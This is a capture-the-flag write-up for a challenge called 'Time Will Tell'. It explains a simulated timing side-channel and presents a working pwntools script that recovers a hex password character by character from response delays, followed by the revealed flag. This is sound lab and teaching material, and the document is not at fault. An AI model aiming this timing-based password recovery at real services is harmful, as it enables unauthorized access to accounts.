## Time Will Tell
A side channel timing attack, which by reading the source code given to us is simulated by a sleep timer for every correct char in the password we guess. So the more correct chars in the correct locations, the longer a response takes. SO by measuring the time difference we can guess what the password might be, rather than being completely blind and bruteforcing.

Here is the script I came up with that isn't perfect, but got the job done.
```python
from pwn import *
import time

HOST = 'challenge.ctf.games'
PORT = 30407

hex_chars = '0123456789abcdef'
NUM_TRIALS = 1  # 1=a , 2=aa -> better avg + longer runtime 

def measure_response_time(conn, guess):
    total_time = 0.0
    for _ in range(NUM_TRIALS):
        conn.sendline(guess.encode())
        start_time = time.perf_counter()
        
        try:
            conn.recvuntil(b': ', timeout=5)
        except EOFError:
            break
        except Exception as e:
            print(f"Error: {e}")
            break

        end_time = time.perf_counter()
        total_time += (end_time - start_time)

    return total_time / NUM_TRIALS

def find_password(conn):
    password = ''
    for position in range(8):
        best_time = 0
        best_char = ''
        for char in hex_chars:
            guess = password + char + '0' * (7 - position)
            response_time = measure_response_time(conn, guess)
            print(f"Trying {guess}: {response_time:.4f} seconds")
            if response_time > best_time:
                best_time = response_time
                best_char = char
        password += best_char
        print(f"Found character {position + 1}: {best_char}")
    return password

# Main execution block
conn = remote(HOST, PORT)
data = conn.recvuntil(b': ', timeout=5)
print("Server says:")
print(data.decode())

password = find_password(conn)
print(f"Password found: {password}")

conn.sendline(password.encode())
try:
    response = conn.recvall(timeout=5).decode()
except EOFError:
    response = ''
print("Server response:")
print(response)
conn.close()
```
Output once correct password is generated:

Well done! Here's your flag: `flag{ab6962e29ed608c0710dbf2910f358d5}`
